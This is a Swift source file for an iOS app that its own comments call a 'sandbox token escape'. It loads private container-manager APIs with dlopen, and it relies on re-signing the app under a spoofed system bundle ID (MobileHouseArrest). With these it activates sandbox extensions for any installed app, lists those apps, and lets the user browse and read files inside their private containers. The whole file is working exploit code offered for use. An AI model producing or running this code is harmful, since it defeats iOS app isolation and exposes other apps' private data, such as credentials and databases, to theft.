// language: Swift, file: ContainerBrowser.swift
// target: iOS 16+, arm64 | technique: FilzaSlop (sandbox token via MCM + MobileHouseArrest BundleID spoof)
// requires: re-sign with com.apple.mobile.MobileHouseArrest bundle ID via eSign/Sideloadly

import SwiftUI
import Foundation

// MARK: - MCM Private API Bindings

private var mcmHandle: UnsafeMutableRawPointer? = nil

typealias container_query_create_f          = @convention(c) () -> UnsafeMutableRawPointer?
typealias container_query_set_identifiers_f = @convention(c) (UnsafeMutableRawPointer?, UnsafePointer<CChar>?) -> Void
typealias container_query_iterate_sync_f    = @convention(c) (UnsafeMutableRawPointer?,
                                                               @convention(c) (UnsafeMutableRawPointer?, UnsafeMutableRawPointer?) -> Void,
                                                               UnsafeMutableRawPointer?) -> Int32
typealias container_object_get_path_f       = @convention(c) (UnsafeMutableRawPointer?) -> UnsafePointer<CChar>?
typealias container_object_sb_ext_act_f     = @convention(c) (UnsafeMutableRawPointer?) -> Int32
typealias container_object_free_f           = @convention(c) (UnsafeMutableRawPointer?) -> Void
typealias container_query_free_f            = @convention(c) (UnsafeMutableRawPointer?) -> Void
typealias sandbox_extension_consume_f       = @convention(c) (UnsafePointer<CChar>?) -> Int64
typealias container_copy_sb_token_f         = @convention(c) (UnsafeMutableRawPointer?) -> UnsafePointer<CChar>?

private var p_cqc:   container_query_create_f? = nil
private var p_cqsi:  container_query_set_identifiers_f? = nil
private var p_cqis:  container_query_iterate_sync_f? = nil
private var p_cogp:  container_object_get_path_f? = nil
private var p_cosbx: container_object_sb_ext_act_f? = nil
private var p_cof:   container_object_free_f? = nil
private var p_cqf:   container_query_free_f? = nil

final class ContainerQueryContext {
    var resolvedPath: String?
}

// C-compatible callback with zero context capture to satisfy @convention(c)
private let containerQueryCallback: @convention(c) (UnsafeMutableRawPointer?, UnsafeMutableRawPointer?) -> Void = { ctx, obj in
    guard let ctx = ctx, let obj = obj else { return }
    let context = Unmanaged<ContainerQueryContext>.fromOpaque(ctx).takeUnretainedValue()
    if let cosbx = p_cosbx, let cogp = p_cogp, let cof = p_cof {
        let rc = cosbx(obj)
        if rc == 0, let cpath = cogp(obj) {
            context.resolvedPath = String(cString: cpath)
        }
        cof(obj)
    }
}

// MARK: - App Enumeration via LSApplicationWorkspace

@objc protocol LSApplicationWorkspaceProtocol {
    func allInstalledApplications() -> [AnyObject]
}

@objc protocol LSApplicationProxyProtocol {
    var bundleIdentifier: String { get }
    var localizedName: String? { get }
    var containerURL: URL? { get }
    var applicationType: String? { get }
}

func enumerateInstalledApps() -> [(bundleID: String, name: String, type: String)] {
    guard
        let wsClass = NSClassFromString("LSApplicationWorkspace") as? NSObject.Type,
        let ws = wsClass.perform(NSSelectorFromString("defaultWorkspace"))?.takeUnretainedValue() as? NSObject,
        let apps = ws.perform(NSSelectorFromString("allInstalledApplications"))?.takeUnretainedValue() as? [NSObject]
    else { return [] }

    return apps.compactMap { app in
        let bundleID = app.perform(NSSelectorFromString("bundleIdentifier"))?.takeUnretainedValue() as? String ?? "unknown"
        let name     = app.perform(NSSelectorFromString("localizedName"))?.takeUnretainedValue() as? String ?? bundleID
        let appType  = app.perform(NSSelectorFromString("applicationType"))?.takeUnretainedValue() as? String ?? "?"
        return (bundleID, name, appType)
    }
}

// MARK: - FilzaSlop Core: Sandbox Token Escape

func resolveContainerPath(for bundleID: String) -> String? {
    if mcmHandle == nil {
        guard let handle = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_LAZY) else { return nil }
        mcmHandle = handle
        p_cqc   = dlsym(handle, "container_query_create").map({ unsafeBitCast($0, to: container_query_create_f.self) })
        p_cqsi  = dlsym(handle, "container_query_set_identifiers").map({ unsafeBitCast($0, to: container_query_set_identifiers_f.self) })
        p_cqis  = dlsym(handle, "container_query_iterate_results_sync").map({ unsafeBitCast($0, to: container_query_iterate_sync_f.self) })
        p_cogp  = dlsym(handle, "container_object_get_path").map({ unsafeBitCast($0, to: container_object_get_path_f.self) })
        p_cosbx = dlsym(handle, "container_object_sandbox_extension_activate").map({ unsafeBitCast($0, to: container_object_sb_ext_act_f.self) })
        p_cof   = dlsym(handle, "container_object_free").map({ unsafeBitCast($0, to: container_object_free_f.self) })
        p_cqf   = dlsym(handle, "container_query_free").map({ unsafeBitCast($0, to: container_query_free_f.self) })
    }

    guard let cqc = p_cqc, let cqsi = p_cqsi, let cqis = p_cqis, let cqf = p_cqf else { return nil }

    guard let query = cqc() else { return nil }
    defer { cqf(query) }

    bundleID.withCString { cqsi(query, $0) }

    let context = ContainerQueryContext()
    let ctxPtr = Unmanaged.passUnretained(context).toOpaque()
    _ = cqis(query, containerQueryCallback, ctxPtr)

    return context.resolvedPath
}

// MARK: - File System Node

struct FSNode: Identifiable {
    let id       = UUID()
    let name:    String
    let path:    String
    var isDirectory: Bool
    var children:    [FSNode]?
    var size:        Int64?
    var modified:    Date?
}

func listDirectory(_ path: String) -> [FSNode] {
    let fm = FileManager.default
    guard let contents = try? fm.contentsOfDirectory(atPath: path) else { return [] }
    return contents.sorted().map { name in
        let full = (path as NSString).appendingPathComponent(name)
        var isDir: ObjCBool = false
        fm.fileExists(atPath: full, isDirectory: &isDir)
        let attrs = try? fm.attributesOfItem(atPath: full)
        return FSNode(
            name:        name,
            path:        full,
            isDirectory: isDir.boolValue,
            children:    isDir.boolValue ? [] : nil,
            size:        attrs?[.size] as? Int64,
            modified:    attrs?[.modificationDate] as? Date
        )
    }
}

// MARK: - ViewModel

@MainActor
class BrowserViewModel: ObservableObject {
    @Published var installedApps: [(bundleID: String, name: String, type: String)] = []
    @Published var currentNodes:  [FSNode] = []
    @Published var pathStack:     [String] = []
    @Published var statusMessage: String   = "Select an app to browse its container"
    @Published var selectedBundleID: String? = nil

    var currentPath: String { pathStack.last ?? "/" }

    func loadApps() {
        Task.detached(priority: .userInitiated) {
            let apps = enumerateInstalledApps()
            await MainActor.run {
                self.installedApps = apps.sorted { $0.name.lowercased() < $1.name.lowercased() }
                self.statusMessage = "\(apps.count) apps found"
            }
        }
    }

    func openContainer(bundleID: String, name: String) {
        statusMessage      = "Resolving container for \(bundleID)…"
        selectedBundleID   = bundleID
        Task.detached(priority: .userInitiated) {
            if let path = resolveContainerPath(for: bundleID) {
                let nodes = listDirectory(path)
                await MainActor.run {
                    self.pathStack    = [path]
                    self.currentNodes = nodes
                    self.statusMessage = "\(name) → \(path)"
                }
            } else {
                await MainActor.run {
                    self.statusMessage = "⚠️ Container access denied for \(bundleID)"
                }
            }
        }
    }

    func navigateInto(_ node: FSNode) {
        guard node.isDirectory else { return }
        let nodes = listDirectory(node.path)
        pathStack.append(node.path)
        currentNodes  = nodes
        statusMessage = node.path
    }

    func navigateUp() {
        guard pathStack.count > 1 else { return }
        pathStack.removeLast()
        currentNodes  = listDirectory(currentPath)
        statusMessage = currentPath
    }

    func readFile(_ node: FSNode) -> String {
        guard !node.isDirectory else { return "" }
        if let data = FileManager.default.contents(atPath: node.path) {
            return String(data: data, encoding: .utf8)
                ?? String(data: data, encoding: .isoLatin1)
                ?? "<binary \(data.count) bytes>"
        }
        return "<unreadable>"
    }
}

// MARK: - Views

struct ContentView: View {
    @StateObject private var vm  = BrowserViewModel()
    @State private var tab: Int  = 0

    var body: some View {
        TabView(selection: $tab) {
            AppListView(vm: vm)
                .tabItem { Label("Apps", systemImage: "square.stack.3d.up") }
                .tag(0)
            FileBrowserView(vm: vm)
                .tabItem { Label("Files", systemImage: "folder") }
                .tag(1)
        }
        .onAppear { vm.loadApps() }
    }
}

struct AppListView: View {
    @ObservedObject var vm: BrowserViewModel

    var body: some View {
        NavigationView {
            List(vm.installedApps, id: \.bundleID) { app in
                Button {
                    vm.openContainer(bundleID: app.bundleID, name: app.name)
                } label: {
                    VStack(alignment: .leading, spacing: 2) {
                        Text(app.name).font(.headline)
                        Text(app.bundleID).font(.caption).foregroundColor(.secondary)
                        Text(app.type).font(.caption2).foregroundColor(.blue)
                    }
                }
                .buttonStyle(.plain)
            }
            .navigationTitle("Installed Apps")
            .navigationBarTitleDisplayMode(.inline)
            .toolbar {
                ToolbarItem(placement: .bottomBar) {
                    Text(vm.statusMessage).font(.caption).foregroundColor(.secondary)
                }
            }
        }
    }
}

struct FileBrowserView: View {
    @ObservedObject var vm: BrowserViewModel
    @State private var selectedFile: FSNode? = nil
    @State private var fileContent:  String  = ""
    @State private var showingFile:  Bool    = false

    var body: some View {
        NavigationView {
            List(vm.currentNodes) { node in
                Button {
                    if node.isDirectory {
                        vm.navigateInto(node)
                    } else {
                        selectedFile = node
                        fileContent  = vm.readFile(node)
                        showingFile  = true
                    }
                } label: {
                    HStack {
                        Image(systemName: node.isDirectory ? "folder.fill" : "doc")
                            .foregroundColor(node.isDirectory ? .yellow : .secondary)
                        VStack(alignment: .leading) {
                            Text(node.name)
                                .font(.body)
                                .foregroundColor(.primary)
                            if let sz = node.size, !node.isDirectory {
                                Text("\(sz) bytes")
                                    .font(.caption2)
                                    .foregroundColor(.secondary)
                            }
                        }
                        Spacer()
                        if node.isDirectory {
                            Image(systemName: "chevron.right")
                                .font(.caption)
                                .foregroundColor(.secondary)
                        }
                    }
                    .padding(.vertical, 2)
                }
                .buttonStyle(.plain)
            }
            .navigationTitle("File Browser")
            .navigationBarTitleDisplayMode(.inline)
            .toolbar {
                ToolbarItem(placement: .navigationBarLeading) {
                    if vm.pathStack.count > 1 {
                        Button("↑ Up") { vm.navigateUp() }
                    }
                }
            }
            .sheet(isPresented: $showingFile) {
                FileViewerSheet(node: selectedFile, content: fileContent)
            }
        }
    }
}

struct FileViewerSheet: View {
    let node:    FSNode?
    let content: String
    @Environment(\.dismiss) var dismiss

    var body: some View {
        NavigationView {
            ScrollView {
                Text(content)
                    .font(.system(.caption, design: .monospaced))
                    .padding()
                    .frame(maxWidth: .infinity, alignment: .leading)
            }
            .navigationTitle(node?.name ?? "File")
            .navigationBarTitleDisplayMode(.inline)
            .toolbar {
                ToolbarItem(placement: .navigationBarTrailing) {
                    Button("Done") { dismiss() }
                }
            }
        }
    }
}

// MARK: - App Entry

@main
struct FilzaBrowseApp: App {
    var body: some Scene {
        WindowGroup { ContentView() }
    }
}
